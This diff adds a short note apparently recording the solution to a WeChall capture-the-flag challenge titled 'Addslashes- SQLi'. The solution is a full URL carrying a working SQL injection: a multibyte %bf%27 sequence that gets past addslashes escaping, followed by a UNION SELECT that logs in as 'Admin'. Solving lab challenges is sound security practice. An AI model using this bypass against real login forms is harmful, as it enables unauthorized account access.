@@ -1,0 +1,6 @@
+Addslashes- SQLi
+http://www.wechall.net/challenge/addslashes/index.php?highlight=christmas
+Solución:
+http://www.wechall.net/challenge/addslashes/index.php?username=%bf%27+u
+nion+select+CHAR%2865,100,109,105,110%29%23&password=123&login=%
+E6%B3%A8%E5%86%8C
